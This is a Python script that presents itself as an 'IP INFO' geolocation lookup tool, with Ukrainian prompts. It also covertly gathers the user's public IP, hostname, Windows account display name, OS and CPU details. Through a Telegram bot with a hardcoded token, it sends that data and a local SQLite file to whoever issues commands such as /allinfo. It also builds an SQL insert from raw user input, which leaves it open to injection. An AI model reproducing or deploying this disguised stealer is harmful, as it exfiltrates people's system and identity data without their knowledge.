from pyfiglet import Figlet
import folium
import bs4
import requests
import time
from tkinter import messagebox
import sqlite3
import socket
import ctypes
import platform
import telebot
bot = telebot.TeleBot("6814382026:AAF2FmkAFVY7Fo-BDSpgwJd5IizfLK1kXZ8")

my_system = platform.uname()

n = socket.gethostname()

s = requests.get('https://2ip.ua/ru/')

b = bs4.BeautifulSoup(s.text, "html.parser")

a = b.select(" .ipblockgradient .ip")[0].getText()

url = "https://api.telegram.org/bot6814382026:AAF2FmkAFVY7Fo-BDSpgwJd5IizfLK1kXZ8/"

connection = sqlite3.connect("ip.sl3", 5)

cur = connection.cursor()

def last_update(r):
    response = requests.get(r + "getUpdates")
    response = response.json()
    result = response['result']
    total_updates = len(result) - 1
    return result[total_updates]


def get_chat_id(u):
    chat_id = u['message']['chat']['id']
    return chat_id


def get_message_text(u):
    text = u['message']['text']
    return text


def send_message(chat, text):
    p = {'chat_id': chat, 'text': text}
    response = requests.post(url + 'sendMessage', params=p)
    return response


def get_info_by_ip(ip='127.0.0.1'):
    try:
        response = requests.get(url=f'http://ip-api.com/json/{ip}').json()

        data = {
            '[IP]': response.get('query'),
            '[Int prov]': response.get('isp'),
            '[Org]': response.get('org'),
            '[Country]': response.get('country'),
            '[Region Name]': response.get('regionName'),
            '[City]': response.get('city'),
            '[ZIP]': response.get('zip'),
            '[Lat]': response.get('lat'),
            '[Lon]': response.get('lon'),
        }

        for k, v in data.items():
            print(f'{k} : {v}')

        area = folium.Map(location=[response.get('lat'), response.get('lon')])
        area.save(f'{response.get("query")}_{response.get("city")}.html')

    except requests.exceptions.ConnectionError:
        print('[!] Please check your connection!')

def get_display_name():
    GetUserNameEx = ctypes.windll.secur32.GetUserNameExW
    NameDisplay = 3

    size = ctypes.pointer(ctypes.c_ulong(0))
    GetUserNameEx(NameDisplay, None, size)

    nameBuffer = ctypes.create_unicode_buffer(size.contents.value)
    GetUserNameEx(NameDisplay, nameBuffer, size)
    return nameBuffer.value

d_n = get_display_name()

def main():
    preview_text = Figlet(font='slant')
    print(preview_text.renderText('IP INFO'))
    messagebox.showinfo("IP", f"Ваш IP: {a}")
    ip = input('Будь ласка напишіть IP дя перевірки: ')
    get_info_by_ip(ip=ip)
    # cur.execute("CREATE TABLE ip_list (ip TEXT);")
    cur.execute(f"INSERT INTO ip_list (ip) VALUES ('{ip}');")
    connection.commit()
    connection.close()
    up_id = last_update(url)['update_id']
    while True:
        upd = last_update(url)
        if up_id == upd['update_id']:

            if get_message_text(upd).lower() == "/ip":
                send_message(get_chat_id(upd), f"IP клієнта: {a}")
            elif get_message_text(upd).lower() == "/start":
                send_message(get_chat_id(upd),
                             "Я Бот для отримання IP адресів клієнтів")
            elif get_message_text(upd).lower() == "/request":
                send_message(get_chat_id(upd),
                             f"Запит клієнта: {ip}")
            elif get_message_text(upd).lower() == "/help":
                send_message(get_chat_id(upd),
                             "Я Бот для отримання IP адресів клієнтів")
            elif get_message_text(upd).lower() == "/pc":
                send_message(get_chat_id(upd),
                             f"Ім'я пристрою клієнта: {n}")
            elif get_message_text(upd).lower() == "/system":
                send_message(get_chat_id(upd),
                             f"ОС: {my_system.system}")
                send_message(get_chat_id(upd),
                             f"Реліз ОС: {my_system.release}")
                send_message(get_chat_id(upd),
                             f"Версія: {my_system.version}")
                send_message(get_chat_id(upd),
                             f"Процессор: {my_system.processor}")
                send_message(get_chat_id(upd),
                             f"Машина: {my_system.machine}")
            elif get_message_text(upd).lower() == "/name":
                send_message(get_chat_id(upd),
                             f"Ім'я облікового запису клієнта: {d_n}")
            elif get_message_text(upd).lower() == "/allinfo":
                send_message(get_chat_id(upd),
                             f"IP клієнта: {a}")
                send_message(get_chat_id(upd),
                             f"Запит клієнта: {ip}")
                send_message(get_chat_id(upd),
                             f"Ім'я пристрою клієнта: {n}")
                send_message(get_chat_id(upd),
                             f"Ім'я облікового запису клієнта: {d_n}")
                send_message(get_chat_id(upd),
                             f"ОС: {my_system.system}")
                send_message(get_chat_id(upd),
                             f"Реліз ОС: {my_system.release}")
                send_message(get_chat_id(upd),
                             f"Версія: {my_system.version}")
                send_message(get_chat_id(upd),
                             f"Процессор: {my_system.processor}")
                send_message(get_chat_id(upd),
                             f"Машина: {my_system.machine}")
                send_message(get_chat_id(upd),
                             f"База даних запитів з пристрою клієнта:")
                upfile = open("ip.sl3", "rb")
                bot.send_document(get_chat_id(upd), upfile)
                upfile.close()
            elif get_message_text(upd).lower() == "/data":
                send_message(get_chat_id(upd),
                             f"База даних запитів з пристрою клієнта:")
                upfile = open("ip.sl3", "rb")
                bot.send_document(get_chat_id(upd), upfile)
                upfile.close()


            else:
                send_message(get_chat_id(upd), "Я не знаю що мені робить :(")
            up_id += 1
        time.sleep(2)



if __name__ == '__main__':
    main()
